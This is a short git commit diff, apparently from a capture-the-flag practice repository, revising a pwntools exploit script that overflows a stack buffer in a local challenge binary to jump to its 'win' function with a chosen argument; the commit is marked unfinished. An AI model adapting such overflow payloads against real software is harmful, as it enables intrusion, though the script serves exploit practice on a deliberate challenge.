255cf63461d80f55283f08d38dbe69a3e5d2c01c
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 21:36:59 -0400

    # NOT FINISHED

--- chall_10/10.py
+++ chall_10/10.py
@@ -1,19 +1,7 @@
 from pwn import *
-
 binary = context.binary = ELF('./chall_10')
+p = process(binary.path)
 
-p = process('./chall_10')
-p.recv()
-
-payload  = b''
-payload += 0x3e * b'A'
-payload += p32(binary.sym.win)
-payload += p32(0)
-payload += p32(0xdeadbeef)
-
-p.sendline(payload)
+p.sendline(b'' + (0x308 - 0x4)*b'A' + p32(binary.sym.win) + p32(0) + p32(0x1a55fac3))
 p.interactive()
-
 # NOT FINISHED
-
-#we can send the payload on the second gets ; the payload will look something like this offset+winaddress+4(for mangling base p)+arg1
